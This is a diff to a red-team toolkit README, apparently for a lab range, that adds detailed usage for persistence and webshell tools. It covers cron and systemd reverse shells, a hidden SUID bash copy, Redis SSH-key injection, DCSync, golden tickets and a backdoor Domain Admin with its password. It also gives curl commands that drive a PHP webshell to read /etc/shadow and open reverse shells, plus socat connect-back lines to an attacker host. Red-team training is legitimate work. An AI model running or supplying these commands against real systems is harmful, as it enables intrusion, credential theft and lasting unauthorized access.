@@ -158,7 +158,7 @@ md() { ./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo "$@"; }
 
 md shadow-crond install
 md ureadahead-persist install --key "$RT_KEY"
-md infinite-users
+md infinite-users install
 md path-hijack install --level system --key "$RT_KEY"
 md path-hijack install --level cron   --key "$RT_KEY"
 md pam-backdoor install
@@ -234,7 +234,7 @@ rt path-hijack scan
 
 # 2. Unlock all service accounts + set password (rt2025!delta by default)
 #    After this, ssh as bin/daemon/www-data/etc. is possible
-rt infinite-users
+rt infinite-users install
 
 # 3. Shadow cron — must be BEFORE lock-busybox
 rt shadow-crond install
@@ -279,7 +279,7 @@ rt() { ./rt-ssh.sh -t "root@${HOST}" -i ~/.ssh/id_ed25519 --no-sudo "$@"; }
 
 rt shadow-crond install
 rt ureadahead-persist install --key "$RT_KEY"
-rt infinite-users           # unlock service accounts (password: rt2025!delta)
+rt infinite-users install   # unlock service accounts (password: rt2025!delta)
 # ... same steps 4–11 as above
 ```
 
@@ -348,51 +348,251 @@ grep -r "rt2025!delta" odessa/ --include="*.sh" --include="*.php" --include="*.c
 
 | Script | Targets | Methods |
 |--------|---------|---------|
-| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
+| `persist/linux_persist.sh` | any Ubuntu host | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
 | `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
 | `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
 | `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |
 
+> **Note:** `linux_persist.sh` and `redis_persist.sh` install reverse shell callbacks. Start a listener BEFORE running them — see [Reverse Shell Listeners](#reverse-shell-listeners) below.
+
+### linux_persist.sh
+
+Deploys 5 persistence methods in one shot against any Ubuntu host you can SSH into. SSH keys are generated automatically and stored at `~/.rt_keys/<ip>_ed25519` on Kali.
+
 ```bash
-# Linux (any Ubuntu host)
-./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>
+# Basic usage — password auth, Kali IP auto-detected
+./persist/linux_persist.sh 10.10.10.101 ubuntu password
 
-# Redis (unauthenticated open Redis)
-./persist/redis_persist.sh <target_ip>
+# With explicit lhost and lport for callbacks
+./persist/linux_persist.sh 10.10.10.101 ubuntu password 10.10.10.200 4444
 
-# AD (after getting DA creds)
-./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>
-
-# Windows (run on a PS shell on target, or via CrackMapExec -X)
-#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
+# Key auth (pass the key as $3 — script detects it's not a password)
+./persist/linux_persist.sh 10.10.10.101 root ~/.ssh/id_ed25519
 ```
+
+What it installs (each step has a `|| echo` so partial failures don't abort):
+1. SSH authorized_keys on user + root (if sudo available)
+2. Cron reverse shell (user crontab + `/etc/cron.d/sysupdate` if root)
+3. Systemd user service (`dbus-update.service`) + system service (`network-monitor.service` if root)
+4. SUID bash copy at `/var/tmp/.sysbin` (root only)
+5. `.bashrc` + `.profile` hook (fires on next interactive login)
+
+After running:
+```bash
+# Connect back via the generated SSH key
+ssh -i ~/.rt_keys/10.10.10.101_ed25519 ubuntu@10.10.10.101
+
+# SUID bash (if root was obtained)
+ssh ubuntu@10.10.10.101 '/var/tmp/.sysbin -p'
+```
+
+### redis_persist.sh
+
+Targets unauthenticated Redis — writes SSH keys and a cron reverse shell via the Redis RDB dump trick.
+
+```bash
+# Unauthenticated Redis on default port
+./persist/redis_persist.sh 10.10.10.102
+
+# With port and password
+./persist/redis_persist.sh 10.10.10.102 6379 redispassword 10.10.10.200 4445
+```
+
+Requires `redis-cli` on Kali (`apt install redis-tools`). Tries `/root/.ssh`, `/home/redis/.ssh`, `/var/lib/redis/.ssh` for key injection and `/etc/cron.d` for cron write (both require Redis running as root).
+
+### ad_persist.sh
+
+Run after obtaining Domain Admin credentials. Dumps all hashes, forges a golden ticket, creates a backdoor DA account, installs AdminSDHolder ACL, and injects a DNS record.
+
+```bash
+./persist/ad_persist.sh 10.10.10.100 domain.local Administrator 'P@ssw0rd' 10.10.10.200
+```
+
+Requires on Kali: `impacket-secretsdump`, `impacket-ticketer`, `impacket-dacledit`, and `nxc`/`netexec` (replaces `crackmapexec` on Kali 2024.1+). Script auto-detects which is installed.
+
+Loot saved to `./ad_loot_<ip>/`:
+- `dcsync.ntds` — all NTLM hashes
+- `golden.ccache` — golden ticket (use with `KRB5CCNAME=...`)
+- Backdoor DA: `svc_healthmon` / `P@ssw0rd_Rt2025!`
+
+```bash
+# Use golden ticket
+KRB5CCNAME=./ad_loot_10.10.10.100/golden.ccache \
+  impacket-wmiexec -k -no-pass domain.local/Administrator@10.10.10.100
+
+# Evil-WinRM with backdoor account
+evil-winrm -i 10.10.10.100 -u svc_healthmon -p 'P@ssw0rd_Rt2025!'
+```
+
+### windows_persist.ps1
+
+Run directly on a Windows target (via WinRM, SMB exec, or an existing shell). Installs 5 persistence methods as SYSTEM.
+
+```powershell
+# On target PS shell
+powershell -ep bypass -File persist/windows_persist.ps1 -LHost 10.10.10.200 -LPort 4446
+
+# Via nxc/crackmapexec
+nxc smb 10.10.10.100 -u Administrator -p 'pass' -X \
+  'powershell -ep bypass -enc <base64_of_script>'
+
+# Via evil-winrm
+evil-winrm -i 10.10.10.100 -u Administrator -p 'pass'
+# then: upload persist/windows_persist.ps1
+# then: powershell -ep bypass -File windows_persist.ps1 -LHost 10.10.10.200 -LPort 4446
+```
+
+---
 
 ## webshells/ — Webshell Deployers
 
 | Script | Target | Technique |
 |--------|--------|-----------|
-| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
+| `webshells/shell.php` | any PHP host | Feature-rich PHP webshell (cmd / upload / read / revshell) |
 | `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
 | `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |
 
 ```bash
 chmod +x webshells/*.sh persist/*.sh
+```
 
-# LAMP
-./webshells/deploy_lamp_shell.sh <target_ip> guest ""
+### deploy_lamp_shell.sh — svc-samba-01
 
-# Flask/Nginx
-./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
+Tries 4 methods in order: Samba write → Apache webroot, LFI probe + log poisoning, PHPMyAdmin default creds + SELECT INTO OUTFILE, common upload endpoints.
+
+```bash
+# Guest SMB (most common — samba-01 allows guest writes)
+./webshells/deploy_lamp_shell.sh 10.10.10.105
+
+# Explicit SMB creds and port
+./webshells/deploy_lamp_shell.sh 10.10.10.105 guest "" 80
+./webshells/deploy_lamp_shell.sh 10.10.10.105 admin password 8080
+```
+
+If successful, shell lands at `http://10.10.10.105/shell.php`. See shell.php quick ref below.
+
+### deploy_nginx_flask_shell.sh — svc-redis-01
+
+Probes SSTI, forges Redis sessions, tests Nginx alias traversal, checks for Werkzeug debug console.
+
+```bash
+# Defaults: web=80, redis=6379, lhost=auto-detected, lport=4447
+./webshells/deploy_nginx_flask_shell.sh 10.10.10.102
+
+# Explicit ports + lhost for reverse shell
+./webshells/deploy_nginx_flask_shell.sh 10.10.10.102 80 6379 10.10.10.200 4447
+```
+
+If SSTI RCE is confirmed, the script fires a reverse shell automatically. Start a listener first:
+```bash
+nc -lvnp 4447
 ```
 
 ### shell.php quick ref (password: `rt2025!delta` — change before use)
 
-| Action | URL |
-|--------|-----|
+| Action | URL / Command |
+|--------|---------------|
 | Command | `?p=rt2025!delta&c=id` |
 | Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
-| Upload | `POST ?p=rt2025!delta&act=upload` |
+| Upload file | `POST ?p=rt2025!delta&act=upload` (multipart `upfile` field) |
 | Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
+
+```bash
+# Execute a command
+curl 'http://TARGET/shell.php?p=rt2025!delta&c=id'
+
+# Read a file
+curl 'http://TARGET/shell.php?p=rt2025!delta&act=read&f=/etc/shadow'
+
+# Upload a file
+curl -F 'upfile=@/path/to/file' 'http://TARGET/shell.php?p=rt2025!delta&act=upload'
+
+# Trigger reverse shell (start nc -lvnp 4444 first)
+curl 'http://TARGET/shell.php?p=rt2025!delta&act=revshell&rh=KALI_IP&rp=4444'
+```
+
+---
+
+## Reverse Shell Listeners
+
+### nc / ncat
+
+```bash
+# Basic — catches bash/python/nc reverse shells
+nc -lvnp 4444
+
+# ncat with SSL (harder to detect)
+ncat --ssl -lvnp 4444
+
+# Keep listener alive (re-opens after each connection)
+ncat -k -lvnp 4444
+```
+
+### socat (full PTY — arrow keys, tab completion, Ctrl-C safe)
+
+```bash
+# On Kali — start PTY listener
+socat file:`tty`,raw,echo=0 tcp-listen:4444,reuseaddr
+
+# On target — connect back
+socat exec:/bin/bash,pty,setsid,sigint,sane tcp:KALI_IP:4444
+```
+
+### rlwrap nc (pseudo-PTY — arrow keys work, simple)
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+### metasploit multi/handler
+
+```bash
+msfconsole -q -x "
+  use exploit/multi/handler;
+  set payload linux/x64/shell_reverse_tcp;
+  set LHOST KALI_IP;
+  set LPORT 4444;
+  set ExitOnSession false;
+  run -j"
+```
+
+### Upgrading a dumb shell to PTY (after catching with nc)
+
+```bash
+# On the caught shell — method 1: python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then: Ctrl-Z → stty raw -echo; fg → reset
+
+# method 2: script
+script -qc /bin/bash /dev/null
+
+# method 3: socat (if socat is on target)
+socat exec:/bin/bash,pty,setsid,sigint,sane tcp:KALI_IP:4445
+```
+
+### Port allocation (avoid collisions between scripts)
+
+| Listener | Default port | Script |
+|----------|-------------|--------|
+| linux_persist.sh callbacks | 4444 | persist/linux_persist.sh |
+| redis_persist.sh cron shell | 4445 | persist/redis_persist.sh |
+| windows_persist.ps1 | 4446 | persist/windows_persist.ps1 |
+| Flask/Nginx SSTI shell | 4447 | webshells/deploy_nginx_flask_shell.sh |
+| shell.php revshell | 4444 (default) | webshells/shell.php |
+
+Start all listeners before mass-deploying persist scripts:
+```bash
+# Open 4 terminals, or use tmux:
+tmux new-session -d -s listeners
+tmux send-keys -t listeners "nc -lvnp 4444" Enter
+tmux split-window -h -t listeners
+tmux send-keys -t listeners "nc -lvnp 4445" Enter
+tmux split-window -v -t listeners
+tmux send-keys -t listeners "nc -lvnp 4446" Enter
+tmux split-window -h -t listeners
+tmux send-keys -t listeners "nc -lvnp 4447" Enter
+tmux attach -t listeners
+```
 
 ---
 
